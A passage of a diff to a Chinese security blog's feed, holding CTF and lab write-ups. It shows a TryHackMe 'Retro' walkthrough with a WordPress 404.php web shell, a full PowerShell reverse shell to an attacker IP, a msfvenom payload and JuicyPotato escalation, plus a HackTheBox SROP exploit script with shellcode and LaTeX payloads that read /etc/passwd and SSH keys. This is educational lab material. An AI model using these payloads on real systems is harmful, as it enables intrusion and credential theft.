-<li>受害者打開了惡意的 .tex 檔案，並用有問題的軟體讀取它</li>
-</ul>
-<p>本文對於LaTeX相關套件的漏洞利用方法分三種：  </p>
-<ul>
-<li>既有函數的濫用</li>
-<li>基於解析函數的注入攻擊</li>
-<li>有問題的模塊利用</li>
-</ul>
-<p>事實上，這些研究的威脅性並沒有那麼大，但簡單易理解的利用方法依然值得玩味，也期待有人玩出更多花招XD (整個ais3我大概只有三天研究，盡力ㄌ)  </p>
-<h2 id="既有函數的濫用"><a href="#既有函數的濫用" class="headerlink" title="既有函數的濫用"></a>既有函數的濫用</h2><p>利用既有函數的功能可以打出 LFI, oob write, Click XSS, RCE和DoS  </p>
-<h3 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h3><p>因為LaTeX支援引入模板檔案，導致可以進行檔案讀取。<br>很多編輯器的防治方法是強制加入 .tex 的副檔名，基本上不要是過舊的語言版本就沒方法繞ㄌ  </p>
-<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line"><span class="keyword">\input</span>&#123;/etc/passwd&#125;</span><br><span class="line"><span class="keyword">\include</span>&#123;/home/wha13/.ssh/id<span class="built_in">_</span>rsa&#125;</span><br><span class="line"><span class="keyword">\lstinputlisting</span>&#123;/usr/share/texmf/web2c/texmf.cnf&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="oob-write"><a href="#oob-write" class="headerlink" title="oob write"></a>oob write</h3><p>道理跟剛剛LFI一樣，問題出在寫檔函數  </p>
-<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line"><span class="keyword">\newwrite</span><span class="keyword">\outfile</span></span><br><span class="line"><span class="keyword">\openout</span><span class="keyword">\outfile</span>=cmd.tex</span><br><span class="line"><span class="keyword">\write</span><span class="keyword">\outfile</span>&#123;Hello-world&#125;</span><br><span class="line"><span class="keyword">\closeout</span><span class="keyword">\outfile</span></span><br></pre></td></tr></table></figure>
-<h3 id="Click-XSS"><a href="#Click-XSS" class="headerlink" title="Click XSS"></a>Click XSS</h3><p>LaTeX支援url，導致可以塞入 <code>javascript:...</code> 這類的協議濫用，受害者點下去後就開心執行javascript…  </p>
-<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line"><span class="keyword">\url</span>&#123;<span class="link">javascript:alert(1)</span>&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>在LaTeX中，有些預定函數如 <code>\write18</code> 本來的功能就是執行系統命令，不過這個東西在編譯的時候可以自行加入<code>--no-shell-escape</code>的flag進行防治。  </p>
-<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line"><span class="keyword">\immediate</span><span class="keyword">\write</span>18&#123;env &gt; output&#125;</span><br><span class="line"><span class="keyword">\input</span>&#123;output&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="DoS"><a href="#DoS" class="headerlink" title="DoS"></a>DoS</h3><p>重複定義，打法跟fork bomb很像  </p>
-<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line"><span class="keyword">\def</span><span class="keyword">\x</span>&#123;<span class="keyword">\x</span>&#125;<span class="keyword">\x</span></span><br><span class="line"><span class="keyword">\def</span><span class="keyword">\x</span>&#123;<span class="keyword">\x</span> <span class="keyword">\x</span>&#125;<span class="keyword">\x</span></span><br></pre></td></tr></table></figure>
-<p>不過基本上都會撞到記憶體限制</p>
-<h2 id="基於解析函數的注入攻擊"><a href="#基於解析函數的注入攻擊" class="headerlink" title="基於解析函數的注入攻擊"></a>基於解析函數的注入攻擊</h2><p>其實我有在某些解析器打出其他注入法可以玩XSS，不過現在不能公開QwQ  </p>
-<p>網路上有個奇怪的payload <code>\input&#123;|&quot;whoami&quot;&#125;</code> ，不過好像都沒有發現原因。<br>打開overleaf試了下，發現居然可以?!<br><img src="https://hackmd.io/_uploads/rJnrm8M9A.png" alt="image"><br><img src="https://hackmd.io/_uploads/HkdLX8f9R.png" alt="image">  </p>
-<p>啊哈，原來因為有獨立VM所以變成一個issue<br>但…為什麼會這樣?<br>故意製造了一下error追原因<br><img src="https://hackmd.io/_uploads/S1bYQ8MqC.png" alt="image">  </p>
-<p>問題好像出在texlive這個解析器身上，code review:<br><a href="https://github.com/TeX-Live/texlive-source/blob/ab42be5a046c960f3ff4a896b1beda6347cb3799/utils/asymptote/picture.cc#L410">https://github.com/TeX-Live/texlive-source/blob/ab42be5a046c960f3ff4a896b1beda6347cb3799/utils/asymptote/picture.cc#L410</a><br>這個函數會把所有參數吞了以後丟到一個vector去執行它，然後沒有過濾?!<br>試了幾個跟texlive相關的軟體發現果然可以，當中不乏可以達成點開檔案即RCE的弱點…  </p>
-<h2 id="有問題的模塊利用"><a href="#有問題的模塊利用" class="headerlink" title="有問題的模塊利用"></a>有問題的模塊利用</h2><p>pythontex可以執行任意python指令並輸出結果，有些LaTeX軟體又可以自動下載第一次使用的模塊，就開心RCEㄌ<br>晚安狐狸晚安我的世界<br>喵喵喵<br>我是鯨魚  </p>
-]]></content>
-      <tags>
-        <tag>LaTeX</tag>
-        <tag>CVE</tag>
       </tags>
   </entry>
   <entry>
@@ -3292,6 +3343,35 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
       </tags>
   </entry>
   <entry>
+    <title>Retro on TryHackMe</title>
+    <url>/2024/03/07/retro-thm/</url>
+    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>又是一台HARD<br>打ㄌ兩天才打下來的機器…<br>等等去弄專題owob  </p>
+<p>Victim’s IP : 10.10.233.57<br>Attacker’s IP : 10.9.195.189  </p>
+<h2 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><h4 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h4><p><strong>Command</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rustscan -a 10.10.233.57 --<span class="built_in">ulimit</span> 5000 -- -sC -sV -Pn</span><br></pre></td></tr></table></figure>
+<p><strong>Result</strong><br><img src="https://hackmd.io/_uploads/BJ2JpR8pT.png" alt="image"><br>port 80是一個web服務，port 3389開了RDP  </p>
+<h4 id="directory-enumeration"><a href="#directory-enumeration" class="headerlink" title="directory enumeration"></a>directory enumeration</h4><p>這邊我使用了<code>dirbuster</code>這項工具，因為<code>dirsearch</code>什麼都打不出來(<br><img src="https://hackmd.io/_uploads/S13mCAUp6.png" alt="image"><br>使用<code>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code>的文檔。<br>結果：<br><img src="https://hackmd.io/_uploads/HkFv0AU6T.png" alt="image"><br>發現路徑<code>/retro</code>，是一個wordpress服務。<br><img src="https://hackmd.io/_uploads/rkpwkywT6.png" alt="image"><br>真的挺retro的。  </p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><h4 id="social-engineering"><a href="#social-engineering" class="headerlink" title="social engineering"></a>social engineering</h4><p>發現管理員<code>wade</code>的奇怪留言：<br><img src="https://hackmd.io/_uploads/Bk84kyvTp.png" alt="image"><br>推測是帳號密碼，以wade&#x2F;parzival登入wordpress管理頁面成功<br>另外，因為有開啟RDP服務，也去使用<code>xfreerdp</code>以及剛剛獲得的帳號密碼進行登入。  </p>
+<h4 id="rdp"><a href="#rdp" class="headerlink" title="rdp"></a>rdp</h4><p>利用剛剛拿到的帳號密碼登入成功。<br><strong>Command</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xfreerdp /u:wade /p:parzival /v:10.10.233.57 /dynamic-resolution</span><br></pre></td></tr></table></figure>
+<p><strong>Result</strong><br><img src="https://hackmd.io/_uploads/S1HvM1Ppa.png" alt="image"><br>RDP成功，拿到user.txt  </p>
+<h4 id="reverse-shell"><a href="#reverse-shell" class="headerlink" title="reverse shell"></a>reverse shell</h4><p>因為拿到了wordpress管理員權限，往404.php塞入shell<br><img src="https://hackmd.io/_uploads/r1f2MJPTa.png" alt="image"><br>裝好後塞入reverseshell.com(<a href="https://www.revshells.com/">link here</a>)生成的powershell payload<br>url:<code>http://10.10.233.57/retro/wp-content/themes/90s-retro/404.php?shark=powershell%20-nop%20-W%20hidden%20-noni%20-ep%20bypass%20-c%20&quot;%24TCPClient%20%3D%20New-Object%20Net.Sockets.TCPClient(&#39;10.9.195.189&#39;%2C%205427)%3B%24NetworkStream%20%3D%20%24TCPClient.GetStream()%3B%24StreamWriter%20%3D%20New-Object%20IO.StreamWriter(%24NetworkStream)%3Bfunction%20WriteToStream%20(%24String)%20%7B%5Bbyte%5B%5D%5D%24script%3ABuffer%20%3D%200..%24TCPClient.ReceiveBufferSize%20%7C%20%%20%7B0%7D%3B%24StreamWriter.Write(%24String%20%2B%20&#39;SHELL&gt;%20&#39;)%3B%24StreamWriter.Flush()%7DWriteToStream%20&#39;&#39;%3Bwhile((%24BytesRead%20%3D%20%24NetworkStream.Read(%24Buffer%2C%200%2C%20%24Buffer.Length))%20-gt%200)%20%7B%24Command%20%3D%20(%5Btext.encoding%5D%3A%3AUTF8).GetString(%24Buffer%2C%200%2C%20%24BytesRead%20-%201)%3B%24Output%20%3D%20try%20%7BInvoke-Expression%20%24Command%202&gt;%261%20%7C%20Out-String%7D%20catch%20%7B%24_%20%7C%20Out-String%7DWriteToStream%20(%24Output)%7D%24StreamWriter.Close()&quot;</code><br>GET SHELL!!!<br><img src="https://hackmd.io/_uploads/HkZD71D6T.png" alt="image">  </p>
+<h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><p>利用 <code>whoami /priv</code> 查詢使用者權限  </p>
+<p><img src="https://hackmd.io/_uploads/ByFdXkva6.png" alt="image"><br>有開啟<code>SeImpersonatePrivilege</code>權限，合理推測能使用提權工具 Juicy Potato做下一步攻擊。<br><strong>註：</strong><a href="https://github.com/ohpe/juicy-potato/releases/tag/v0.1">https://github.com/ohpe/juicy-potato/releases/tag/v0.1</a><br>利用<code>msfvenom</code>生成<code>exe</code> reverse shell<br><strong>Command</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp lhost=10.9.195.189 lport=1004 -f exe -o ./x64winreverse.exe</span><br></pre></td></tr></table></figure>
+<p>透過剛剛的reverse shell在機器上安裝JuicyPotato.exe以及x64winreverse.exe<br>接著查詢對應的CLSID並一一嘗試：<br>(CLSID表：<a href="https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2016_Standard">https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2016_Standard</a>)<br><strong>Command</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./JuicyPotato.exe -t * -l 1004  -p x64winreverse.exe -c <span class="string">&quot;&#123;F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+<p><strong>Result</strong><br><img src="https://hackmd.io/_uploads/HkjwVJvTp.png" alt="image"><br>成功在監聽端口得到回應!!!  </p>
+<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>第一次玩JuicyPotato，有趣XD  </p>
+]]></content>
+      <tags>
+        <tag>Pentesting</tag>
+        <tag>Windows</tag>
+        <tag>TryHackMe</tag>
+        <tag>JuicyPotato</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Reset on Tryhackme</title>
     <url>/2024/06/01/reset-thm/</url>
     <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>好久沒打ADㄌ，開心&gt;w&lt;<br>而且今天學到超多東西，也釐清了不少觀念  </p>
@@ -3330,35 +3410,6 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
         <tag>crackmapexec</tag>
         <tag>smb</tag>
         <tag>impersonate</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Retro on TryHackMe</title>
-    <url>/2024/03/07/retro-thm/</url>
-    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>又是一台HARD<br>打ㄌ兩天才打下來的機器…<br>等等去弄專題owob  </p>
-<p>Victim’s IP : 10.10.233.57<br>Attacker’s IP : 10.9.195.189  </p>
-<h2 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><h4 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h4><p><strong>Command</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rustscan -a 10.10.233.57 --<span class="built_in">ulimit</span> 5000 -- -sC -sV -Pn</span><br></pre></td></tr></table></figure>
-<p><strong>Result</strong><br><img src="https://hackmd.io/_uploads/BJ2JpR8pT.png" alt="image"><br>port 80是一個web服務，port 3389開了RDP  </p>
-<h4 id="directory-enumeration"><a href="#directory-enumeration" class="headerlink" title="directory enumeration"></a>directory enumeration</h4><p>這邊我使用了<code>dirbuster</code>這項工具，因為<code>dirsearch</code>什麼都打不出來(<br><img src="https://hackmd.io/_uploads/S13mCAUp6.png" alt="image"><br>使用<code>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code>的文檔。<br>結果：<br><img src="https://hackmd.io/_uploads/HkFv0AU6T.png" alt="image"><br>發現路徑<code>/retro</code>，是一個wordpress服務。<br><img src="https://hackmd.io/_uploads/rkpwkywT6.png" alt="image"><br>真的挺retro的。  </p>
-<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><h4 id="social-engineering"><a href="#social-engineering" class="headerlink" title="social engineering"></a>social engineering</h4><p>發現管理員<code>wade</code>的奇怪留言：<br><img src="https://hackmd.io/_uploads/Bk84kyvTp.png" alt="image"><br>推測是帳號密碼，以wade&#x2F;parzival登入wordpress管理頁面成功<br>另外，因為有開啟RDP服務，也去使用<code>xfreerdp</code>以及剛剛獲得的帳號密碼進行登入。  </p>
-<h4 id="rdp"><a href="#rdp" class="headerlink" title="rdp"></a>rdp</h4><p>利用剛剛拿到的帳號密碼登入成功。<br><strong>Command</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xfreerdp /u:wade /p:parzival /v:10.10.233.57 /dynamic-resolution</span><br></pre></td></tr></table></figure>
-<p><strong>Result</strong><br><img src="https://hackmd.io/_uploads/S1HvM1Ppa.png" alt="image"><br>RDP成功，拿到user.txt  </p>
-<h4 id="reverse-shell"><a href="#reverse-shell" class="headerlink" title="reverse shell"></a>reverse shell</h4><p>因為拿到了wordpress管理員權限，往404.php塞入shell<br><img src="https://hackmd.io/_uploads/r1f2MJPTa.png" alt="image"><br>裝好後塞入reverseshell.com(<a href="https://www.revshells.com/">link here</a>)生成的powershell payload<br>url:<code>http://10.10.233.57/retro/wp-content/themes/90s-retro/404.php?shark=powershell%20-nop%20-W%20hidden%20-noni%20-ep%20bypass%20-c%20&quot;%24TCPClient%20%3D%20New-Object%20Net.Sockets.TCPClient(&#39;10.9.195.189&#39;%2C%205427)%3B%24NetworkStream%20%3D%20%24TCPClient.GetStream()%3B%24StreamWriter%20%3D%20New-Object%20IO.StreamWriter(%24NetworkStream)%3Bfunction%20WriteToStream%20(%24String)%20%7B%5Bbyte%5B%5D%5D%24script%3ABuffer%20%3D%200..%24TCPClient.ReceiveBufferSize%20%7C%20%%20%7B0%7D%3B%24StreamWriter.Write(%24String%20%2B%20&#39;SHELL&gt;%20&#39;)%3B%24StreamWriter.Flush()%7DWriteToStream%20&#39;&#39;%3Bwhile((%24BytesRead%20%3D%20%24NetworkStream.Read(%24Buffer%2C%200%2C%20%24Buffer.Length))%20-gt%200)%20%7B%24Command%20%3D%20(%5Btext.encoding%5D%3A%3AUTF8).GetString(%24Buffer%2C%200%2C%20%24BytesRead%20-%201)%3B%24Output%20%3D%20try%20%7BInvoke-Expression%20%24Command%202&gt;%261%20%7C%20Out-String%7D%20catch%20%7B%24_%20%7C%20Out-String%7DWriteToStream%20(%24Output)%7D%24StreamWriter.Close()&quot;</code><br>GET SHELL!!!<br><img src="https://hackmd.io/_uploads/HkZD71D6T.png" alt="image">  </p>
-<h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><p>利用 <code>whoami /priv</code> 查詢使用者權限  </p>
-<p><img src="https://hackmd.io/_uploads/ByFdXkva6.png" alt="image"><br>有開啟<code>SeImpersonatePrivilege</code>權限，合理推測能使用提權工具 Juicy Potato做下一步攻擊。<br><strong>註：</strong><a href="https://github.com/ohpe/juicy-potato/releases/tag/v0.1">https://github.com/ohpe/juicy-potato/releases/tag/v0.1</a><br>利用<code>msfvenom</code>生成<code>exe</code> reverse shell<br><strong>Command</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp lhost=10.9.195.189 lport=1004 -f exe -o ./x64winreverse.exe</span><br></pre></td></tr></table></figure>
-<p>透過剛剛的reverse shell在機器上安裝JuicyPotato.exe以及x64winreverse.exe<br>接著查詢對應的CLSID並一一嘗試：<br>(CLSID表：<a href="https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2016_Standard">https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2016_Standard</a>)<br><strong>Command</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./JuicyPotato.exe -t * -l 1004  -p x64winreverse.exe -c <span class="string">&quot;&#123;F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4&#125;&quot;</span></span><br></pre></td></tr></table></figure>
-<p><strong>Result</strong><br><img src="https://hackmd.io/_uploads/HkjwVJvTp.png" alt="image"><br>成功在監聽端口得到回應!!!  </p>
-<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>第一次玩JuicyPotato，有趣XD  </p>
-]]></content>
-      <tags>
-        <tag>Pentesting</tag>
-        <tag>Windows</tag>
-        <tag>TryHackMe</tag>
-        <tag>JuicyPotato</tag>
       </tags>
   </entry>
   <entry>
@@ -3409,34 +3460,6 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
       </tags>
   </entry>
   <entry>
-    <title>Sick ROP on HackTheBox / SROP</title>
-    <url>/2024/04/23/sickrop-htb/</url>
-    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><h3 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h3><p>SROP &#x3D; Sigreturn Oriented Programming<br>一支程式如果接到signal，它會把寄存器值存到stack上，這叫signal frame<br>而這些資料被處裡完後需要透過<code>__restore_rt</code>的函數去做<code>return</code>進行真的存取，也就是<a href="https://syscalls.w3challs.com/?arch=x86_64">syscall table</a>上面<code>0xf</code>的syscall<code>rt_sigreturn</code><br>利用場景主要就在ROP GADGET非常不足時…  </p>
-<h2 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h2><h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h3><p><strong>checksec</strong><br><img src="https://hackmd.io/_uploads/BJataEH-0.png" alt="image">  </p>
-<p><strong>ROPgadget</strong><br><img src="https://hackmd.io/_uploads/ByNdpErWC.png" alt="image">  </p>
-<p><strong>radare2</strong><br><img src="https://hackmd.io/_uploads/rkCs6VBW0.png" alt="image">  </p>
-<p>可以發現很缺少ROP CHAIN, 程式本身只有開nx的防護，可以利用syscall table裡面的<code>mprotect</code>(就是<code>0xa</code>)進行資料段改權限。  </p>
-<p>幾個觀察點：<br>RAX的值會隨著輸入長度+1(因為會算上換行)而改變  </p>
-<p>找可寫入的地址：(with gdb-peda vmmap)<br><img src="https://hackmd.io/_uploads/B15JJBr-0.png" alt="image">  </p>
-<p>syscall 時需要呼叫回去vuln的函數，找一個指向它地址的指標：<br><img src="https://hackmd.io/_uploads/rJRWkSSW0.png" alt="image">  </p>
-<p>就可以湊出利用 Sigreturn 改寫權限的 signal frame：  </p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">writable = <span class="number">0x400000</span></span><br><span class="line">frame = SigreturnFrame(kernel=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line">frame.rax = <span class="number">10</span></span><br><span class="line">frame.rdi = writable</span><br><span class="line">frame.rsi = <span class="number">0x40000</span> <span class="comment"># size</span></span><br><span class="line">frame.rdx = <span class="number">7</span> <span class="comment">### r/w/x</span></span><br><span class="line">frame.rsp = vuln_pointer</span><br><span class="line">frame.rip = syscall</span><br></pre></td></tr></table></figure>
-
-<p>最後改寫成功就可以繞調 NX 防護，然後進行一般的 RET 2 SHELLCODE!!!  </p>
-<p>完整腳本：  </p>
-<p>Exploit.py  </p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#r=process(&#x27;./sick_rop&#x27;)</span></span><br><span class="line">r=remote(<span class="string">&#x27;83.136.255.150&#x27;</span>, <span class="number">52277</span>)</span><br><span class="line">rop=ROP(<span class="string">&#x27;./sick_rop&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gadgets</span></span><br><span class="line"></span><br><span class="line">vuln=<span class="number">0x0040102e</span></span><br><span class="line">vuln_pointer=<span class="number">0x4010d8</span></span><br><span class="line">shellcode=<span class="string">b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span></span><br><span class="line">syscall=rop.syscall[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># sig payload</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## NX bypass</span></span><br><span class="line">writable = <span class="number">0x400000</span></span><br><span class="line">frame = SigreturnFrame(kernel=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line">frame.rax = <span class="number">10</span></span><br><span class="line">frame.rdi = writable</span><br><span class="line">frame.rsi = <span class="number">0x40000</span></span><br><span class="line">frame.rdx = <span class="number">7</span> <span class="comment">### r/w/x</span></span><br><span class="line">frame.rsp = vuln_pointer</span><br><span class="line">frame.rip = syscall</span><br><span class="line"></span><br><span class="line"><span class="comment"># exploit</span></span><br><span class="line">payload1=<span class="string">b&#x27;w&#x27;</span>*<span class="number">40</span>+flat(vuln, syscall)+<span class="built_in">bytes</span>(frame)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">b&#x27;w&#x27;</span>*<span class="number">14</span>)</span><br><span class="line">r.recv()</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">payload2=shellcode+<span class="string">b&#x27;w&#x27;</span>*<span class="number">17</span>+p64(<span class="number">0x4010b8</span>)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/HyrLkSBZ0.png" alt="image">  </p>
-<p>p.s.中間有利用pwntools的gdb看過return address<br><img src="https://hackmd.io/_uploads/HJjwyHSZA.png" alt="image">  </p>
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-        <tag>pwn</tag>
-        <tag>HackTheBox</tag>
-        <tag>SROP</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>SunshineCTF 2024 Write Up</title>
     <url>/2024/10/22/sunshinectf-2024/</url>
     <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>Rank: 10<br>Team: WAN<br>一年了，真快…<br>遙想去年這時候我還在跟初次組隊的隊友 @cakeisthefake_naup 和 @cakeisthefake_aukro 半夜兩點研究怎麼拆100分題的git bundle … 這一年來真的進步很多，從這場對於我們意義重大的比賽可見一斑：從76名殺到前十欸！  </p>
@@ -3484,6 +3507,34 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
         <tag>SunShine CTF</tag>
         <tag>GoLang</tag>
         <tag>Activitypub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Sick ROP on HackTheBox / SROP</title>
+    <url>/2024/04/23/sickrop-htb/</url>
+    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><h3 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h3><p>SROP &#x3D; Sigreturn Oriented Programming<br>一支程式如果接到signal，它會把寄存器值存到stack上，這叫signal frame<br>而這些資料被處裡完後需要透過<code>__restore_rt</code>的函數去做<code>return</code>進行真的存取，也就是<a href="https://syscalls.w3challs.com/?arch=x86_64">syscall table</a>上面<code>0xf</code>的syscall<code>rt_sigreturn</code><br>利用場景主要就在ROP GADGET非常不足時…  </p>
+<h2 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h2><h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h3><p><strong>checksec</strong><br><img src="https://hackmd.io/_uploads/BJataEH-0.png" alt="image">  </p>
+<p><strong>ROPgadget</strong><br><img src="https://hackmd.io/_uploads/ByNdpErWC.png" alt="image">  </p>
+<p><strong>radare2</strong><br><img src="https://hackmd.io/_uploads/rkCs6VBW0.png" alt="image">  </p>
+<p>可以發現很缺少ROP CHAIN, 程式本身只有開nx的防護，可以利用syscall table裡面的<code>mprotect</code>(就是<code>0xa</code>)進行資料段改權限。  </p>
+<p>幾個觀察點：<br>RAX的值會隨著輸入長度+1(因為會算上換行)而改變  </p>
+<p>找可寫入的地址：(with gdb-peda vmmap)<br><img src="https://hackmd.io/_uploads/B15JJBr-0.png" alt="image">  </p>
+<p>syscall 時需要呼叫回去vuln的函數，找一個指向它地址的指標：<br><img src="https://hackmd.io/_uploads/rJRWkSSW0.png" alt="image">  </p>
+<p>就可以湊出利用 Sigreturn 改寫權限的 signal frame：  </p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">writable = <span class="number">0x400000</span></span><br><span class="line">frame = SigreturnFrame(kernel=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line">frame.rax = <span class="number">10</span></span><br><span class="line">frame.rdi = writable</span><br><span class="line">frame.rsi = <span class="number">0x40000</span> <span class="comment"># size</span></span><br><span class="line">frame.rdx = <span class="number">7</span> <span class="comment">### r/w/x</span></span><br><span class="line">frame.rsp = vuln_pointer</span><br><span class="line">frame.rip = syscall</span><br></pre></td></tr></table></figure>
+
+<p>最後改寫成功就可以繞調 NX 防護，然後進行一般的 RET 2 SHELLCODE!!!  </p>
+<p>完整腳本：  </p>
+<p>Exploit.py  </p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#r=process(&#x27;./sick_rop&#x27;)</span></span><br><span class="line">r=remote(<span class="string">&#x27;83.136.255.150&#x27;</span>, <span class="number">52277</span>)</span><br><span class="line">rop=ROP(<span class="string">&#x27;./sick_rop&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gadgets</span></span><br><span class="line"></span><br><span class="line">vuln=<span class="number">0x0040102e</span></span><br><span class="line">vuln_pointer=<span class="number">0x4010d8</span></span><br><span class="line">shellcode=<span class="string">b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span></span><br><span class="line">syscall=rop.syscall[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># sig payload</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## NX bypass</span></span><br><span class="line">writable = <span class="number">0x400000</span></span><br><span class="line">frame = SigreturnFrame(kernel=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line">frame.rax = <span class="number">10</span></span><br><span class="line">frame.rdi = writable</span><br><span class="line">frame.rsi = <span class="number">0x40000</span></span><br><span class="line">frame.rdx = <span class="number">7</span> <span class="comment">### r/w/x</span></span><br><span class="line">frame.rsp = vuln_pointer</span><br><span class="line">frame.rip = syscall</span><br><span class="line"></span><br><span class="line"><span class="comment"># exploit</span></span><br><span class="line">payload1=<span class="string">b&#x27;w&#x27;</span>*<span class="number">40</span>+flat(vuln, syscall)+<span class="built_in">bytes</span>(frame)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">b&#x27;w&#x27;</span>*<span class="number">14</span>)</span><br><span class="line">r.recv()</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">payload2=shellcode+<span class="string">b&#x27;w&#x27;</span>*<span class="number">17</span>+p64(<span class="number">0x4010b8</span>)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/HyrLkSBZ0.png" alt="image">  </p>
+<p>p.s.中間有利用pwntools的gdb看過return address<br><img src="https://hackmd.io/_uploads/HJjwyHSZA.png" alt="image">  </p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
